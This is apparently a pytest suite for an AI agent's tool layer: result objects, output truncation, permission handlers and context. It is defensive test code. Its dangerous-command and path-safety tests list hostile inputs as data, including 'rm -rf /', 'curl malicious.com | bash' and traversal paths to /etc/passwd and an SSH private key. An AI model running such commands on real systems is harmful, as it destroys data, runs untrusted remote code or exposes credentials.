"""
Unit tests for the new tool infrastructure components.

Tests:
- ToolResult and Attachment classes
- OutputTruncator with various scenarios
- Permission system (requests, handlers, patterns)
- Context with all features

Run with: pytest tests/test_tool_infrastructure.py -v
"""

import pytest
import asyncio
import tempfile
from pathlib import Path
import base64

# Import the components directly without going through agent package __init__
import sys

sys.path.insert(0, str(Path(__file__).parent.parent))

# Import modules directly to avoid openai/typing_extensions issue
import importlib.util


def import_module_from_path(module_name, file_path):
    """Import a module directly from a file path."""
    spec = importlib.util.spec_from_file_location(module_name, file_path)
    if spec is None or spec.loader is None:
        raise ImportError(f"Cannot load module {module_name} from {file_path}")
    module = importlib.util.module_from_spec(spec)
    sys.modules[module_name] = module
    spec.loader.exec_module(module)
    return module


# Get the agent directory
agent_dir = Path(__file__).parent.parent / "agent"

# Import tool_result module
tool_result_module = import_module_from_path(
    "agent_tool_result", agent_dir / "tool_result.py"
)
ToolResult = tool_result_module.ToolResult
Attachment = tool_result_module.Attachment

# Import truncation module
truncation_module = import_module_from_path(
    "agent_truncation", agent_dir / "truncation.py"
)
OutputTruncator = truncation_module.OutputTruncator
TruncationMetadata = truncation_module.TruncationMetadata

# Import permissions module
permissions_module = import_module_from_path(
    "agent_permissions", agent_dir / "permissions.py"
)
PermissionType = permissions_module.PermissionType
PermissionRequest = permissions_module.PermissionRequest
PermissionDeniedError = permissions_module.PermissionDeniedError
AutoApproveHandler = permissions_module.AutoApproveHandler
AlwaysAllowHandler = permissions_module.AlwaysAllowHandler
AlwaysDenyHandler = permissions_module.AlwaysDenyHandler
is_path_safe = permissions_module.is_path_safe
is_command_dangerous = permissions_module.is_command_dangerous

# Import context module (depends on permissions)
context_module = import_module_from_path("agent_context", agent_dir / "context.py")
Context = context_module.Context
create_context = context_module.create_context
create_auto_approve_context = context_module.create_auto_approve_context
Message = context_module.Message


# =============================================================================
# ToolResult Tests
# =============================================================================


class TestAttachment:
    """Tests for Attachment class."""

    def test_create_attachment(self):
        """Test creating a basic attachment."""
        att = Attachment(
            type="file",
            content=b"hello world",
            filename="test.txt",
            mime_type="text/plain",
        )

        assert att.type == "file"
        assert att.content == b"hello world"
        assert att.filename == "test.txt"
        assert att.mime_type == "text/plain"

    def test_attachment_to_dict(self):
        """Test converting attachment to dictionary."""
        att = Attachment(
            type="image",
            content=b"\x89PNG\r\n\x1a\n",
            filename="test.png",
            mime_type="image/png",
            description="A test image",
        )

        data = att.to_dict()

        assert data["type"] == "image"
        assert data["filename"] == "test.png"
        assert data["mime_type"] == "image/png"
        assert data["description"] == "A test image"
        assert data["content_encoding"] == "base64"
        assert isinstance(data["content"], str)

    def test_attachment_from_file(self):
        """Test creating attachment from file."""
        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
            f.write("test content")
            temp_path = f.name

        try:
            att = Attachment.from_file(temp_path, description="Test file")

            assert att.type == "file"
            assert att.content == b"test content"
            assert att.filename.endswith(".txt")
            assert att.mime_type == "text/plain"
            assert att.description == "Test file"
        finally:
            Path(temp_path).unlink()


class TestToolResult:
    """Tests for ToolResult class."""

    def test_create_success_result(self):
        """Test creating a successful result."""
        result = ToolResult(
            title="Operation succeeded",
            output="Everything worked fine",
            metadata={"status": "ok"},
        )

        assert result.title == "Operation succeeded"
        assert result.output == "Everything worked fine"
        assert result.metadata["status"] == "ok"
        assert result.is_success
        assert not result.is_error
        assert result.error is None

    def test_create_error_result(self):
        """Test creating an error result."""
        result = ToolResult(title="Operation failed", output="", error="File not found")

        assert result.title == "Operation failed"
        assert result.error == "File not found"
        assert result.is_error
        assert not result.is_success

    def test_success_factory(self):
        """Test success factory method."""
        result = ToolResult.success("Read file", "content here", lines=10, size=100)

        assert result.is_success
        assert result.metadata["lines"] == 10
        assert result.metadata["size"] == 100

    def test_error_factory(self):
        """Test error factory method."""
        result = ToolResult.error(
            "Failed to read", "Permission denied", file_path="/etc/passwd"
        )

        assert result.is_error
        assert result.error == "Permission denied"
        assert result.metadata["file_path"] == "/etc/passwd"

    def test_add_attachment(self):
        """Test adding attachments."""
        result = ToolResult("Test", "output")
        att = Attachment("file", b"data", filename="test.txt")

        result.add_attachment(att)

        assert len(result.attachments) == 1
        assert result.attachments[0].filename == "test.txt"

    def test_add_metadata(self):
        """Test adding metadata."""
        result = ToolResult("Test", "output")
        result.add_metadata(foo="bar", count=42)

        assert result.metadata["foo"] == "bar"
        assert result.metadata["count"] == 42

    def test_to_dict(self):
        """Test converting to dictionary."""
        result = ToolResult("Test", "output", metadata={"key": "value"}, error=None)

        data = result.to_dict()

        assert data["title"] == "Test"
        assert data["output"] == "output"
        assert data["metadata"]["key"] == "value"
        assert data["is_success"] == True

    def test_to_llm_string(self):
        """Test formatting for LLM consumption."""
        result = ToolResult(
            "Executed command", "Command output here", metadata={"exit_code": 0}
        )

        llm_str = result.to_llm_string()

        assert "Executed command" in llm_str
        assert "Command output here" in llm_str

    def test_to_llm_string_with_error(self):
        """Test formatting error result for LLM."""
        result = ToolResult("Failed", "", error="Something went wrong")

        llm_str = result.to_llm_string()

        assert "Failed" in llm_str
        assert "ERROR: Something went wrong" in llm_str


# =============================================================================
# OutputTruncator Tests
# =============================================================================


class TestOutputTruncator:
    """Tests for OutputTruncator class."""

    def test_no_truncation_needed(self):
        """Test when output is within limits."""
        truncator = OutputTruncator(max_lines=100, max_bytes=10000)
        output = "line\n" * 50  # 50 lines

        truncated, metadata = truncator.truncate(output, "test_call")

        assert truncated == output
        assert not metadata.is_truncated
        assert metadata.total_lines == 51  # 50 lines + 1 from final split

    def test_truncation_by_lines(self):
        """Test truncation when exceeding line limit."""
        truncator = OutputTruncator(max_lines=10, max_bytes=100000)
        output = "line\n" * 20  # 20 lines

        truncated, metadata = truncator.truncate(output, "test_call")

        assert metadata.is_truncated
        assert metadata.total_lines == 21
        assert metadata.truncated_at_line == 10
        assert "OUTPUT TRUNCATED" in truncated
        assert "Total lines: 21" in truncated

    def test_truncation_by_bytes(self):
        """Test truncation when exceeding byte limit."""
        truncator = OutputTruncator(max_lines=10000, max_bytes=100)
        output = "x" * 1000  # 1000 bytes

        truncated, metadata = truncator.truncate(output, "test_call")

        assert metadata.is_truncated
        assert metadata.total_bytes == 1000

    def test_truncation_creates_file(self):
        """Test that full output is written to file."""
        with tempfile.TemporaryDirectory() as tmpdir:
            truncator = OutputTruncator(max_lines=5, max_bytes=100000, temp_dir=tmpdir)
            output = "line\n" * 10

            truncated, metadata = truncator.truncate(output, "test_call_123")

            assert metadata.full_output_file is not None

            # Check file exists and contains full output
            file_path = Path(metadata.full_output_file)
            assert file_path.exists()
            assert file_path.read_text() == output

    def test_truncation_with_context(self):
        """Test truncation with context string."""
        truncator = OutputTruncator(max_lines=5)
        output = "line\n" * 10

        truncated, metadata = truncator.truncate(
            output, "test_call", context="command output"
        )

        assert "(command output)" in truncated

    def test_truncate_by_bytes_method(self):
        """Test byte-only truncation method."""
        truncator = OutputTruncator()
        output = "x" * 1000

        truncated, metadata = truncator.truncate_by_bytes(
            output, "test_call", max_bytes=100
        )

        assert metadata.is_truncated
        assert len(truncated.encode("utf-8")) < 1000

    def test_clean_old_files(self):
        """Test cleaning up old truncated files."""
        with tempfile.TemporaryDirectory() as tmpdir:
            truncator = OutputTruncator(max_lines=5, temp_dir=tmpdir)

            # Create some truncated outputs
            for i in range(3):
                output = "line\n" * 10
                truncator.truncate(output, f"call_{i}")

            # Check files were created
            files = list(Path(tmpdir).glob("output_*.txt"))
            assert len(files) == 3

            # Clean with max_age_hours=0 should delete all
            deleted = truncator.clean_old_files(max_age_hours=0)
            assert deleted == 3

            # Check files were deleted
            files = list(Path(tmpdir).glob("output_*.txt"))
            assert len(files) == 0


# =============================================================================
# Permission System Tests
# =============================================================================


class TestPermissionRequest:
    """Tests for PermissionRequest class."""

    def test_create_request(self):
        """Test creating a permission request."""
        request = PermissionRequest(
            permission=PermissionType.BASH,
            patterns=["npm install"],
            metadata={"cwd": "/project"},
        )

        assert request.permission == PermissionType.BASH
        assert request.patterns == ["npm install"]
        assert request.metadata["cwd"] == "/project"

    def test_request_to_dict(self):
        """Test converting request to dictionary."""
        request = PermissionRequest(
            permission=PermissionType.READ,
            patterns=["config.json"],
            description="Read configuration",
        )

        data = request.to_dict()

        assert data["permission"] == "read"
        assert data["patterns"] == ["config.json"]
        assert data["description"] == "Read configuration"

    def test_matches_always_patterns(self):
        """Test pattern matching for always-allow."""
        request = PermissionRequest(
            permission=PermissionType.READ,
            patterns=["README.md"],
            always=["*.md", "*.txt"],
        )

        assert request.matches_always_patterns("README.md")
        assert request.matches_always_patterns("docs.md")
        assert not request.matches_always_patterns("config.json")

    def test_should_auto_approve(self):
        """Test auto-approval logic."""
        request = PermissionRequest(
            permission=PermissionType.READ,
            patterns=["README.md", "docs.md"],
            always=["*.md"],
        )

        assert request.should_auto_approve()

        request.patterns.append("config.json")
        assert not request.should_auto_approve()


class TestPermissionHandlers:
    """Tests for permission handler classes."""

    @pytest.mark.asyncio
    async def test_always_allow_handler(self):
        """Test AlwaysAllowHandler."""
        handler = AlwaysAllowHandler()
        request = PermissionRequest(
            permission=PermissionType.BASH, patterns=["rm -rf /"]
        )

        approved = await handler.request_permission(request)
        assert approved == True

    @pytest.mark.asyncio
    async def test_always_deny_handler(self):
        """Test AlwaysDenyHandler."""
        handler = AlwaysDenyHandler()
        request = PermissionRequest(
            permission=PermissionType.READ, patterns=["config.json"]
        )

        approved = await handler.request_permission(request)
        assert approved == False

    @pytest.mark.asyncio
    async def test_auto_approve_handler_matches(self):
        """Test AutoApproveHandler with matching patterns."""
        handler = AutoApproveHandler()
        handler.add_pattern(PermissionType.READ, "*.md")
        handler.add_pattern(PermissionType.READ, "*.txt")

        request = PermissionRequest(
            permission=PermissionType.READ, patterns=["README.md"]
        )

        approved = await handler.request_permission(request)
        assert approved == True

    @pytest.mark.asyncio
    async def test_auto_approve_handler_no_match(self):
        """Test AutoApproveHandler with non-matching patterns."""
        handler = AutoApproveHandler()
        handler.add_pattern(PermissionType.READ, "*.md")

        request = PermissionRequest(
            permission=PermissionType.READ, patterns=["config.json"]
        )

        approved = await handler.request_permission(request)
        assert approved == False

    @pytest.mark.asyncio
    async def test_auto_approve_handler_with_fallback(self):
        """Test AutoApproveHandler with fallback handler."""
        fallback = AlwaysAllowHandler()
        handler = AutoApproveHandler(fallback_handler=fallback)
        handler.add_pattern(PermissionType.READ, "*.md")

        # Non-matching pattern should fall back to AlwaysAllowHandler
        request = PermissionRequest(
            permission=PermissionType.READ, patterns=["config.json"]
        )

        approved = await handler.request_permission(request)
        assert approved == True  # Fallback approves

    @pytest.mark.asyncio
    async def test_auto_approve_handler_add_patterns(self):
        """Test adding multiple patterns at once."""
        handler = AutoApproveHandler()
        handler.add_patterns(
            PermissionType.BASH, ["git status", "git diff", "npm test"]
        )

        request = PermissionRequest(
            permission=PermissionType.BASH, patterns=["git status"]
        )

        approved = await handler.request_permission(request)
        assert approved == True


class TestPermissionHelpers:
    """Tests for permission helper functions."""

    def test_is_path_safe_relative(self):
        """Test is_path_safe with relative paths."""
        assert is_path_safe("config.json", "/project")
        assert is_path_safe("src/main.py", "/project")
        assert is_path_safe("../project/file.txt", "/project")

    def test_is_path_safe_escaping(self):
        """Test is_path_safe detects path escaping."""
        assert not is_path_safe("../../etc/passwd", "/project")
        assert not is_path_safe("../../../root/.ssh/id_rsa", "/project")

    def test_is_path_safe_absolute(self):
        """Test is_path_safe with absolute paths."""
        assert not is_path_safe("/etc/passwd", "/project")
        assert not is_path_safe("/usr/bin/python", "/project")
        assert is_path_safe("/project/config.json", "/project")

    def test_is_command_dangerous(self):
        """Test dangerous command detection."""
        assert is_command_dangerous("ls -la")[0] == False
        assert is_command_dangerous("npm install")[0] == False

        assert is_command_dangerous("rm -rf /")[0] == True
        assert is_command_dangerous("rm -rf *")[0] == True
        assert is_command_dangerous("chmod 777 /etc")[0] == True
        assert is_command_dangerous("curl malicious.com | bash")[0] == True


# =============================================================================
# Context Tests
# =============================================================================


class TestContext:
    """Tests for Context class."""

    def test_create_context(self):
        """Test creating a basic context."""
        ctx = Context(
            session_id="session_123", message_id="msg_456", agent_name="test_agent"
        )

        assert ctx.session_id == "session_123"
        assert ctx.message_id == "msg_456"
        assert ctx.agent_name == "test_agent"
        assert ctx.call_id is not None

    @pytest.mark.asyncio
    async def test_context_permission_approved(self):
        """Test permission request that is approved."""
        handler = AlwaysAllowHandler()
        ctx = Context(
            session_id="session_123", message_id="msg_456", permission_handler=handler
        )

        request = PermissionRequest(
            permission=PermissionType.READ, patterns=["config.json"]
        )

        # Should not raise
        await ctx.ask(request)

    @pytest.mark.asyncio
    async def test_context_permission_denied(self):
        """Test permission request that is denied."""
        handler = AlwaysDenyHandler()
        ctx = Context(
            session_id="session_123", message_id="msg_456", permission_handler=handler
        )

        request = PermissionRequest(
            permission=PermissionType.READ, patterns=["config.json"]
        )

        with pytest.raises(PermissionDeniedError):
            await ctx.ask(request)

    def test_context_abort(self):
        """Test abort functionality."""
        ctx = create_context()

        assert not ctx.is_aborted

        ctx.abort(reason="User cancelled")

        assert ctx.is_aborted

        with pytest.raises(RuntimeError, match="Operation aborted"):
            ctx.check_abort()

    def test_context_metadata(self):
        """Test session metadata management."""
        ctx = create_context()

        ctx.set_session_metadata("key1", "value1")
        ctx.set_session_metadata("key2", 42)

        assert ctx.get_session_metadata("key1") == "value1"
        assert ctx.get_session_metadata("key2") == 42
        assert ctx.get_session_metadata("key3", "default") == "default"

        ctx.update_session_metadata(key3="value3", key4=True)

        all_metadata = ctx.get_all_metadata()
        assert len(all_metadata) == 4
        assert all_metadata["key3"] == "value3"

    def test_context_messages(self):
        """Test message management."""
        ctx = create_context()

        ctx.add_message("user", "Hello", extra="data")
        ctx.add_message("assistant", "Hi there")

        messages = ctx.get_messages()
        assert len(messages) == 2
        assert messages[0].role == "user"
        assert messages[0].content == "Hello"

        user_messages = ctx.get_messages(role="user")
        assert len(user_messages) == 1

        limited = ctx.get_messages(limit=1)
        assert len(limited) == 1
        assert limited[0].role == "assistant"

    def test_context_truncate_output(self):
        """Test output truncation via context."""
        ctx = create_context()
        output = "line\n" * 100

        truncated, metadata = ctx.truncate_output(output, context="test")

        assert isinstance(truncated, str)
        assert isinstance(metadata, dict)
        assert "total_lines" in metadata

    def test_context_to_dict(self):
        """Test converting context to dictionary."""
        ctx = Context(
            session_id="session_123", message_id="msg_456", agent_name="test_agent"
        )

        data = ctx.to_dict()

        assert data["session_id"] == "session_123"
        assert data["message_id"] == "msg_456"
        assert data["agent_name"] == "test_agent"
        assert "call_id" in data
        assert "is_aborted" in data

    @pytest.mark.asyncio
    async def test_context_stream_metadata(self):
        """Test metadata streaming callback."""
        ctx = create_context()

        received_data = []

        async def callback(data):
            received_data.append(data)

        ctx.set_metadata_callback(callback)

        await ctx.stream_metadata({"progress": 50})
        await ctx.stream_metadata({"progress": 100})

        assert len(received_data) == 2
        assert received_data[0]["progress"] == 50
        assert received_data[1]["progress"] == 100


class TestContextFactories:
    """Tests for context factory functions."""

    def test_create_context_auto_ids(self):
        """Test create_context with auto-generated IDs."""
        ctx = create_context()

        assert ctx.session_id is not None
        assert ctx.message_id is not None

    def test_create_auto_approve_context(self):
        """Test create_auto_approve_context."""
        ctx = create_auto_approve_context(
            patterns={"read": ["*.md", "*.txt"], "bash": ["git status"]}
        )

        assert ctx._permission_handler is not None

    @pytest.mark.asyncio
    async def test_create_auto_approve_context_works(self):
        """Test that auto-approve context actually auto-approves."""
        ctx = create_auto_approve_context(patterns={"read": ["*.md"]})

        request = PermissionRequest(
            permission=PermissionType.READ, patterns=["README.md"]
        )

        # Should not raise
        await ctx.ask(request)


# =============================================================================
# Integration Tests
# =============================================================================


class TestIntegration:
    """Integration tests combining multiple components."""

    @pytest.mark.asyncio
    async def test_full_tool_flow(self):
        """Test a complete tool execution flow."""
        # Create context with auto-approve
        ctx = create_auto_approve_context(patterns={"bash": ["echo *"]})

        # Request permission
        request = PermissionRequest(
            permission=PermissionType.BASH,
            patterns=["echo 'hello'"],
            metadata={"cwd": "/project"},
        )

        await ctx.ask(request)

        # Simulate tool output
        output = "hello\n" * 100

        # Truncate output
        truncated, trunc_meta = ctx.truncate_output(output, "bash execution")

        # Create result
        result = ToolResult.success(
            "Executed: echo hello", truncated, exit_code=0, **trunc_meta
        )

        # Verify result
        assert result.is_success
        assert "exit_code" in result.metadata
        assert "total_lines" in result.metadata

        # Convert to LLM string
        llm_str = result.to_llm_string()
        assert "Executed: echo hello" in llm_str

    @pytest.mark.asyncio
    async def test_permission_denied_flow(self):
        """Test flow when permission is denied."""
        # Create context that denies everything
        ctx = Context(
            session_id="test", message_id="test", permission_handler=AlwaysDenyHandler()
        )

        request = PermissionRequest(
            permission=PermissionType.WRITE,
            patterns=["/etc/passwd"],
            metadata={"dangerous": True},
        )

        # Should raise PermissionDeniedError
        with pytest.raises(PermissionDeniedError) as exc_info:
            await ctx.ask(request)

        # Create error result
        error = exc_info.value
        result = ToolResult.error(
            "Permission denied", str(error), patterns=request.patterns
        )

        assert result.is_error
        assert "Permission denied" in result.error


if __name__ == "__main__":
    # Run tests with pytest
    pytest.main([__file__, "-v", "--tb=short"])
